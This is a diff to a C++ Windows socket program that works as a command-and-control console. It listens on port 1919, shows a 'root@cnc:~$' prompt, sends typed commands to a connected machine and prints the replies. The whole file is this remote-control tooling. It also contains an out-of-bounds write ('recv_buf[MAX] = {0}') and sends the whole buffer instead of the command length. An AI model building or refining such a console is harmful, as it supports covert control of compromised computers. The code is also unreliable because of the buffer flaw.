@@ -2,7 +2,7 @@
 #include <cstring>
 #include <thread>
 #include <winsock2.h>
-#pragma comment(lib,"ws2_32.lib")
+#include <ws2tcpip.h>
 
 #define MAX 8192
 
@@ -18,21 +18,7 @@ private:
 
     int status;
     int result;
-
-    char input[MAX];
 public:
-    server()
-    {
-        init(1919);
-    }
-
-    void init(int n)
-    {
-        recv_buf[MAX] = {};
-        send_buf[MAX] = {};
-        port_number = n;
-    }
-
     void cnc();
 
     ~server() {
@@ -44,6 +30,8 @@ void server::cnc() {
     if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0) {
         return;
     }
+
+    port_number = 1919;
 
     struct sockaddr_in src_addr;
     memset(&src_addr, 0, sizeof(src_addr));
@@ -61,29 +49,36 @@ void server::cnc() {
 
     listen(src_socket, 1);
 
+    dst_socket = accept(src_socket, (struct sockaddr *) &dst_addr, &dst_addr_size);
+
     while (1) {
-        dst_socket = accept(src_socket, (struct sockaddr *) &dst_addr, &dst_addr_size);
+        printf("root@cnc:~$ ");
+        fgets(send_buf, sizeof(send_buf), stdin);
+        send_buf[strcspn(send_buf, "\r\n")] = 0;
 
-        while (1) {
-            fgets(input, sizeof(input), stdin);
+        send(dst_socket, send_buf, sizeof(send_buf), 0);
+        if (!strcmp(send_buf, "exit")) break;
 
-            send(dst_socket, send_buf, sizeof(send_buf), 0);
-
-            result = recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
-            if (result == 0 || result == -1) {
-                status = closesocket(dst_socket);
-                break;
-            }
-
-            printf("%s", recv_buf);
+        result = recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
+        if (result == 0 || result == -1) {
+            status = closesocket(dst_socket);
+            break;
         }
+
+        printf("%s", recv_buf);
+        recv_buf[MAX] = {0};
     }
 }
 
-int main() {
+void start() {
     server* cnc_server;
+    cnc_server = new server();
 
-    std::thread th(server::cnc, cnc_server);
+    cnc_server->cnc();
+}
+
+int main() {
+    std::thread th(start);
     th.join();
 
     return 0;
